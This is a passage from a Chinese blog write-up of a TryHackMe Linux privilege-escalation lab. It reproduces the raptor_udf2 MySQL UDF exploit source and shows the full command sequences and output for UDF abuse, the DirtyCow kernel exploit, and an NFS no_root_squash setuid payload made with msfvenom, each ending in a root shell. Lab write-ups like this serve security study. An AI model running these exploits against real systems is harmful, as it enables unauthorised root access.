raptor_udf2.c</span></span><br><span class="line"><span class="comment"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span></span><br><span class="line"><span class="comment"> * $ mysql -u root -p</span></span><br><span class="line"><span class="comment"> * Enter password:</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * mysql&gt; use mysql;</span></span><br><span class="line"><span class="comment"> * mysql&gt; create table foo(line blob);</span></span><br><span class="line"><span class="comment"> * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;));</span></span><br><span class="line"><span class="comment"> * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;;</span></span><br><span class="line"><span class="comment"> * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span></span><br><span class="line"><span class="comment"> * mysql&gt; select * from mysql.func;</span></span><br><span class="line"><span class="comment"> * +-----------+-----+----------------+----------+</span></span><br><span class="line"><span class="comment"> * | name      | ret | dl             | type     |</span></span><br><span class="line"><span class="comment"> * +-----------+-----+----------------+----------+</span></span><br><span class="line"><span class="comment"> * | do_system |   2 | raptor_udf2.so | function |</span></span><br><span class="line"><span class="comment"> * +-----------+-----+----------------+----------+</span></span><br><span class="line"><span class="comment"> * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;);</span></span><br><span class="line"><span class="comment"> * mysql&gt; \! sh</span></span><br><span class="line"><span class="comment"> * sh-2.05b$ cat /tmp/out</span></span><br><span class="line"><span class="comment"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Item_result</span> &#123;</span>STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">st_udf_args</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>            arg_count;      <span class="comment">// number of arguments</span></span><br><span class="line">        <span class="class"><span class="keyword">enum</span> <span class="title">Item_result</span>        *<span class="title">arg_type</span>;</span>      <span class="comment">// pointer to item_result</span></span><br><span class="line">        <span class="type">char</span>                    **args;         <span class="comment">// pointer to arguments</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           *lengths;       <span class="comment">// length of string args</span></span><br><span class="line">        <span class="type">char</span>                    *maybe_null;    <span class="comment">// 1 for maybe_null args</span></span><br><span class="line">&#125; UDF_ARGS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">st_udf_init</span> &#123;</span></span><br><span class="line">        <span class="type">char</span>                    maybe_null;     <span class="comment">// 1 if func can return NULL</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>            decimals;       <span class="comment">// for real functions</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           max_length;     <span class="comment">// for string functions</span></span><br><span class="line">        <span class="type">char</span>                    *ptr;           <span class="comment">// free ptr for func data</span></span><br><span class="line">        <span class="type">char</span>                    const_item;     <span class="comment">// 0 if result is constant</span></span><br><span class="line">&#125; UDF_INIT;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">do_system</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="type">char</span> *is_null, <span class="type">char</span> *error)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (args-&gt;arg_count != <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        system(args-&gt;args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="title function_">do_system_init</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="type">char</span> *message)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// milw0rm.com [2006-02-20]                           </span></span><br></pre></td></tr></table></figure>

<p><strong>选择这个是因为适用的版本范围较为广泛，利用方式在上面的注释中写的一清二楚，我们先以root身份尝试无密码登录，并且查看secure_file_priv字段是否为空</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools/mysql-udf$ mysql -uroot -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 35</span><br><span class="line">Server version: 5.1.73-1+deb6u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &quot;%secure_file_priv%&quot;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>

<p><strong>无密码root，且该字段为空，可以尝试使用UDF提权</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC</span><br><span class="line">user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">user@debian:~/tools/mysql-udf$ ls</span><br><span class="line">raptor_udf2.c  raptor_udf2.o  raptor_udf2.so</span><br></pre></td></tr></table></figure>

<p><strong>编译命令为POC所给，想弄的更明白可以去问chatGPT，接下来继续按照POC操作</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/home/user/tools/mysql-udf/raptor_udf2.so&#x27;));</span><br><span class="line">//这里的路劲与所给的POC有所不同，我们可以查询一下，以自己查询的为准</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;</span><br><span class="line">create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//查询</span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">show variables like <span class="string">&#x27;%plugin%&#x27;</span>;</span></span><br><span class="line">+---------------+-----------------------+</span><br><span class="line">| Variable_name | Value                 |</span><br><span class="line">+---------------+-----------------------+</span><br><span class="line">| plugin_dir    | /usr/lib/mysql/plugin |</span><br><span class="line">+---------------+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>在MYSQL中依次执行上述命令，就创建好了一个函数，函数名为do_system，执行时加载我们编译的.so文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select do_system(&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;);</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| do_system(&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;) |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">|                                                                0 |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>提权成功</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools/mysql-udf$ /tmp/rootbash -p</span><br><span class="line">rootbash-4.1# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3>内核漏洞提权</h3>

<p><strong>可以跑linpeas.sh确定是否有内核漏洞，也可以跑如下的脚本<code>linux-exploit-suggester-2.pl</code>确定</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ser@debian:~/tools$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash"><span class="comment">############################</span></span></span><br><span class="line">   Linux Exploit Suggester 2</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash"><span class="comment">############################</span></span></span><br><span class="line"></span><br><span class="line"> Local Kernel: 2.6.32</span><br><span class="line"> Searching 72 exploits...</span><br><span class="line"></span><br><span class="line"> Possible Exploits</span><br><span class="line"></span><br><span class="line"> [3] dirty_cow</span><br><span class="line">     CVE-2016-5195</span><br><span class="line">     Source: http://www.exploit-db.com/exploits/40616</span><br></pre></td></tr></table></figure>

<p><strong>发现存在脏牛漏洞的，根据链接去搜索poc</strong></p>
<p><img src="/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/4.png" alt="4"></p>
<p><strong>按照POC说明，编译提权</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w</span><br><span class="line">user@debian:~/tools$ ./c0w</span><br><span class="line">                                </span><br><span class="line">   (___)                                   </span><br><span class="line">   (o o)_____/                             </span><br><span class="line">    @@ `     \                            </span><br><span class="line">     \ ____, //usr/bin/passwd                          </span><br><span class="line">     //    //                              </span><br><span class="line">    ^^    ^^                               </span><br><span class="line">DirtyCow root privilege escalation</span><br><span class="line">Backing up /usr/bin/passwd to /tmp/bak</span><br><span class="line">mmap f901c000</span><br><span class="line"></span><br><span class="line">madvise 0</span><br><span class="line"></span><br><span class="line">ptrace 0</span><br><span class="line"></span><br><span class="line">user@debian:~/tools$ /usr/bin/passwd</span><br><span class="line">root@debian:/home/user/tools# whoami</span><br><span class="line">root</span><br><span class="line">root@debian:/home/user/tools# </span><br></pre></td></tr></table></figure>

<p><strong>内核漏洞就是跑跑脚本，然后去看看都有啥能利用的漏洞</strong></p>
<h3>NFS提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools$ cat /etc/exports</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/exports: the access control list <span class="keyword">for</span> filesystems <span class="built_in">which</span> may be exported</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">		to NFS clients.  See exports(5).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Example for NFSv2 and NFSv3:</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/srv/homes       hostname1(rw,<span class="built_in">sync</span>,no_subtree_check) hostname2(ro,<span class="built_in">sync</span>,no_subtree_check)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Example for NFSv4:</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/srv/nfs4        gss/krb5i(rw,<span class="built_in">sync</span>,fsid=0,crossmnt,no_subtree_check)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/srv/nfs4/homes  gss/krb5i(rw,<span class="built_in">sync</span>,no_subtree_check)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line">/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/tmp *(rw,<span class="built_in">sync</span>,insecure,no_subtree_check)</span></span><br></pre></td></tr></table></figure>

<p><strong>no_root_squash这一选项允许 NFS 客户端以 <code>root</code> 用户身份访问共享目录，会造成潜在的威胁，其它参数可自行查阅，*代表任何主机都可以访问该共享目录</strong></p>
<p><strong>我们在攻击机里面输入如下命令，确保是以root身份启动的shell</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-10-181-21:~# mkdir /tmp/nfs</span><br><span class="line">root@ip-10-10-181-21:~# mount -o rw,vers=3 10.10.241.224:/tmp /tmp/nfs</span><br><span class="line">root@ip-10-10-181-21:~# cd /tmp/nfs/</span><br><span class="line">root@ip-10-10-181-21:/tmp/nfs# ls</span><br><span class="line">backup.tar.gz  rootbash  useless</span><br><span class="line">root@ip-10-10-181-21:/tmp/nfs# </span><br></pre></td></tr></table></figure>

<p><strong>此时目标机器的&#x2F;tmp文件夹已经被我们共享</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-10-181-21:/tmp/nfs# msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 48 bytes</span><br><span class="line">Final size of elf file: 132 bytes</span><br><span class="line">Saved as: /tmp/nfs/shell.elf</span><br><span class="line">root@ip-10-10-181-21:/tmp/nfs# ls</span><br><span class="line">backup.tar.gz  rootbash  shell.elf  useless</span><br><span class="line">root@ip-10-10-181-21:/tmp/nfs# chmod +xs /tmp/nfs/shell.elf</span><br><span class="line">root@ip-10-10-181-21:/tmp/nfs# </span><br></pre></td></tr></table></figure>

<p><strong>生成命令文件，并赋予s与x权限，然后在目标机器上查看权限</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~/tools$ cd /tmp/</span><br><span class="line">user@debian:/tmp$ ls -la</span><br><span class="line">total 1180</span><br><span class="line">drwxrwxrwt  2 root root   4096 Jan 19 09:30 .</span><br><span class="line">drwxr-xr-x 22 root root   4096 Aug 25  2019 ..</span><br><span class="line">-rw-r--r--  1 root root 251830 Jan 19 09:30 backup.tar.gz</span><br><span class="line">-rwsr-s--x  1 root root 926536 Jan 19 08:15 rootbash</span><br><span class="line">-rwsr-sr-x  1 root root    132 Jan 19 09:30 shell.elf</span><br><span class="line">-rw-r--r--  1 root root     29 Jan 19 09:30 useless</span><br></pre></td></tr></table></figure>

<p><strong>执行提权</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:/tmp$ ./shell.elf </span><br><span class="line">bash-4.1# whoami</span><br><span class="line">root</span><br><span class="line">bash-4.1# </span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">总览</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">VHub</a></li>
         
          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-安全</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Try-Hack-Me:LUNIX提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">可写&#x2F;etc&#x2F;passwd提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">可读&#x2F;etc&#x2F;shadow文件提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">可写&#x2F;etc&#x2F;shadow文件提取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">无密码sudo命令提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.5.</span> <span class="toc-text">sudo环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.6.</span> <span class="toc-text">计划任务提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.7.</span> <span class="toc-text">计划任务-环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.8.</span> <span class="toc-text">历史命令-密码泄露提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.9.</span> <span class="toc-text">配置文件-密码泄露提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.10.</span> <span class="toc-text">.ssh密钥泄露提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.11.</span> <span class="toc-text">定时任务-通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.12.</span> <span class="toc-text">SUID&#x2F;SGID可执行文件提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.13.</span> <span class="toc-text">SUID&#x2F;SGID可执行文件提权共享库提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.14.</span> <span class="toc-text">SUID&#x2F;SGID可执行文件环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.15.</span> <span class="toc-text">SUID&#x2F;SGID可执行文件利用shell功能提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.16.</span> <span class="toc-text">MySql服务漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.17.</span> <span class="toc-text">内核漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.18.</span> <span class="toc-text">NFS提权</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&text=try-hack-me:lunix提权"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&is_video=false&description=try-hack-me:lunix提权"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=try-hack-me:lunix提权&body=Check out this article: http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&name=try-hack-me:lunix提权&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&t=try-hack-me:lunix提权"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    SunRT
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">总览</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">VHub</a></li>
         
          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-安全</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
